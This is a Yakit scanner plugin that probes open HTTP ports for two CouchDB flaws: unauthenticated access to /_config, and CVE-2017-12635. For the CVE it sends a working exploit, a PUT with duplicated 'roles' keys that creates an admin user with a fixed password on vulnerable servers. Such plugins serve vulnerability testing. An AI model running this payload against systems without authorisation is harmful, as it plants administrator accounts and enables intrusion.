# port scan plugin
yakit.AutoInitYakit()

// 准备发送的报文模版 

Packetpoc1 = `GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

`
Packetpoc2 = `PUT /_users/org.couchdb.user:66d4aaa5ea177ac32c69946de3731ec0 HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Encoding: gzip
Content-Length: 192
Content-Type: application/json
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

{{params(payload)}}`
//漏洞检测规则函数 
rules = []
addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
    rules = append(rules, {
        "packet": packet,
        "payload": payload,
        "check": check,
        "type": riskType,
        "typeVerbose": riskTypeVerbose,
        "severity": severity,
        "reference":reference,
    })
}


//填充对应的漏洞检测规则
addRule(Packetpoc1,`/_config`,func(rsp,header,body){
    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `httpd_design_handlers`, `external_manager`, `replicator_manager`){
        return true
    }
    return false
},"未授权访问","couchdb-unauth","high","https://www.seebug.org/vuldb/ssvid-91597")

addRule(Packetpoc2,`{"type": "user","name": "66d4aaa5ea177ac32c69946de3731ec0","roles": ["_admin"],"roles": [],"password": "fVyuyAECgYEAhgJzkPO1sTV1Dvs5bvls4tyVAsLy2I7wHKWJvJdDUpox2TnCMFT9"}`,func(rsp,header,body){
    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `org.couchdb.user:66d4aaa5ea177ac32c69946de3731ec0`){
        return true
    }
    return false
},"垂直越权","couchdb-cve-2017-12635","high","https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635")



//漏洞检测handle 
handleRule = func(swg, isTls, addr, rule) {
    swg.Add()
    go func{
        defer swg.Done()

        defer func{
            recover()
        }

        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
        if err != nil {
            yakit.Error("poc.HTTP error: %v", err)
            return
        }
        header, body = poc.Split(resp)
        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
        url = urlIns.String()
        if rule.check(rspIns, header, body) {
            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
            risk.NewRisk(
                url, risk.severity(rule.severity), 
                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
                risk.titleVerbose(sprintf("reference %v", rule.reference)),
                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
                risk.payload(rule.payload), risk.details({
                    "request": req,
                    "response": resp,
                    "url": url,
                }),
            )
            return
        }
        return
    }
}



handle = func(result) {
    if !result.IsOpen() {
        return
    }

    //判断是否是http
    if len(result.Fingerprint.HttpFlows) <= 0 {
        return
    }
    addr = str.HostPort(result.Target, result.Port)
    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))

    // 漏洞检测
    swg = sync.NewSizedWaitGroup(10)
    for _, rule = range rules {
        handleRule(swg, isTls, addr, rule)
    }
    swg.Wait()
}
